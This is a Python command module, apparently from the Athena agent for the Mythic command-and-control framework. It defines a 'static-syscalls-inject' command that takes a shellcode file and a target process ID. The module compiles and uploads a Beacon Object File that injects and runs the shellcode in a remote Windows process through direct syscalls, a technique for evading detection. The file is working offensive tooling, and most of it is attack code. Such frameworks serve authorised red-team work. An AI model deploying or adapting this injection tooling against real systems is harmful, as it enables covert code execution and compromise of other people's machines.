from mythic_container.MythicCommandBase import *  # import the basics
import json  # import any other code you might need
# import the code for interacting with Files on the Mythic server
from mythic_container.MythicRPC import *
from ..athena_utils import bof_utilities
import os

# create a class that extends TaskArguments class that will supply all the arguments needed for this command
class StaticSyscallsInjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        # this is the part where you'd add in your additional tasking parameters
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                    ),
                ],
            ),
            CommandParameter(
                name="pid",
                type=ParameterType.Number,
                description="Inject into a specific existing process",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                    )
                ],
            ),
        ]

    # you must implement this function so that you can parse out user typed input into your paramters or load your parameters based on some JSON input
    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)


# this is information about the command itself
class StaticSyscallsInjectCommand(CommandBase):
    cmd = "static-syscalls-inject"
    needs_admin = False
    help_cmd = "inject-shellcode"
    description = "Execute a shellcode buffer in a remote process and (optionally) return the output"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@ajpc500"
    argument_class = StaticSyscallsInjectArguments
    attackmapping = []
    browser_script = None
    attributes = CommandAttributes(
        supported_os=[
            SupportedOS.Windows,
        ],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        arch = taskData.Callback.Architecture


        if(arch=="x86"):
            raise Exception("BOF's are currently only supported on x64 architectures")

        fData = FileData()
        fData.AgentFileId = taskData.args.get_arg("file")
        file = await SendMythicRPCFileGetContent(fData)
        groupName = taskData.args.get_parameter_group_name()
        if file.Success:
            file_contents = file.Content
        else:
            raise Exception("Failed to get file contents: " + file.Error)


        bof_path = f"/Mythic/athena/mythic/agent_functions/misc_bofs/staticsyscallsinject/syscallsinject.{arch}.o"
        if(os.path.isfile(bof_path) == False):
            await bof_utilities.compile_bof("/Mythic/athena/mythic/agent_functions/misc_bofs/staticsyscallsinject/")

        # Read the COFF file from the proper directory
        with open(bof_path, "rb") as coff_file:
            encoded_file = base64.b64encode(coff_file.read())

        # Upload the COFF file to Mythic, delete after using so that we don't have a bunch of wasted space used
        file_resp = await MythicRPC().execute("create_file",
                                    task_id=taskData.Task.ID,
                                    file=encoded_file,
                                    delete_after_fetch=True)  
        OfArgs = []
        OfArgs.append(bof_utilities.generate32bitInt(taskData.args.get_arg("pid")))
        OfArgs.append(bof_utilities.generateBinary(file_contents))
        encoded_args = base64.b64encode(bof_utilities.SerializeArgs(OfArgs)).decode()

        resp = await MythicRPC().execute("create_subtask_group", tasks=[
            {"command": "coff", "params": {"coffFile":file_resp.response["agent_file_id"], "functionName":"go","arguments": encoded_args, "timeout":"60"}},
            ], 
            subtask_group_name = "coff", parent_task_id=taskData.Task.ID)

        return response


